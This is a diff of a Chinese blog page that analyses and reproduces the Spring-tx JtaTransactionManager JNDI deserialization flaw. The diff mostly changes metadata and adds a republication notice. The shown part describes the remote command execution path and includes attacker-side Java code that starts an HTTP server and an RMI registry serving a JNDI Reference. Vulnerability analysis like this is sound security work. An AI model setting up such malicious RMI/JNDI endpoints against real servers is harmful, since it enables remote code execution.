@@ -108,19 +108,19 @@
 
 
 
-  <meta name="description" content="spring-jndi反序列化众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的org.springframeworkl.transation.jta.JtaTransationManager类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后">
+  <meta name="description" content="打包发布于安全客https://www.anquanke.com/post/id/173459  spring-jndi反序列化众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的org.springframeworkl.transation.jta.Jt">
 <meta name="keywords" content="Web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Spring-jndi 反序列化漏洞分析复现">
 <meta property="og:url" content="https://hexo.imagemlt.xyz/post/java-unserialize-learning-2/index.html">
 <meta property="og:site_name" content="Image&#39;s blog">
-<meta property="og:description" content="spring-jndi反序列化众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的org.springframeworkl.transation.jta.JtaTransationManager类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后">
+<meta property="og:description" content="打包发布于安全客https://www.anquanke.com/post/id/173459  spring-jndi反序列化众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的org.springframeworkl.transation.jta.Jt">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1g02nr05wyuj317r0o1qem.jpg">
-<meta property="og:updated_time" content="2019-02-11T12:40:15.370Z">
+<meta property="og:updated_time" content="2019-03-22T00:32:27.599Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Spring-jndi 反序列化漏洞分析复现">
-<meta name="twitter:description" content="spring-jndi反序列化众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的org.springframeworkl.transation.jta.JtaTransationManager类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后">
+<meta name="twitter:description" content="打包发布于安全客https://www.anquanke.com/post/id/173459  spring-jndi反序列化众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的org.springframeworkl.transation.jta.Jt">
 <meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1g02nr05wyuj317r0o1qem.jpg">
 
 
@@ -361,12 +361,24 @@
                 
               
 
-              <time title="Created: 2019-02-11 17:35:22 / Modified: 20:40:15" itemprop="dateCreated datePublished" datetime="2019-02-11T17:35:22+08:00">2019-02-11</time>
+              <time title="Created: 2019-02-11 17:35:22" itemprop="dateCreated datePublished" datetime="2019-02-11T17:35:22+08:00">2019-02-11</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-22 08:32:27" itemprop="dateModified" datetime="2019-03-22T08:32:27+08:00">2019-03-22</time>
               
             
           </span>
@@ -399,7 +411,10 @@
       
 
       
-        <h2 id="spring-jndi反序列化"><a href="#spring-jndi反序列化" class="headerlink" title="spring-jndi反序列化"></a>spring-jndi反序列化</h2><p>众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的<code>org.springframeworkl.transation.jta.JtaTransationManager</code>类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后将对象发送到有漏洞的服务器从而执行远程命令。首先应当注意本文中成功执行的Poc本人仅在jdk1.7中测试成功，而jdk1.8中未测试成功。</p>
+        <blockquote>
+<p>打包发布于安全客<a href="https://www.anquanke.com/post/id/173459">https://www.anquanke.com/post/id/173459</a></p>
+</blockquote>
+<h2 id="spring-jndi反序列化"><a href="#spring-jndi反序列化" class="headerlink" title="spring-jndi反序列化"></a>spring-jndi反序列化</h2><p>众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的<code>org.springframeworkl.transation.jta.JtaTransationManager</code>类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后将对象发送到有漏洞的服务器从而执行远程命令。首先应当注意本文中成功执行的Poc本人仅在jdk1.7中测试成功，而jdk1.8中未测试成功。</p>
 <h3 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI?"></a>什么是JNDI?</h3><p><code>JNDI</code>(Java Naming and Directory Interface)是J2EE中的重要规范之一，是一组在Java应用中访问命名和目录服务的API，使得我们能够通过名称去查询数据源从而访问需要的对象。</p>
 <p>这里我们给出在java下的一段提供JNDI服务的代码：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8086</span>), <span class="number">0</span>);</span><br><span class="line">httpServer.createContext(<span class="string">"/"</span>,<span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">httpServer.start();</span><br><span class="line">			</span><br><span class="line">System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.01:8086/"</span>);</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
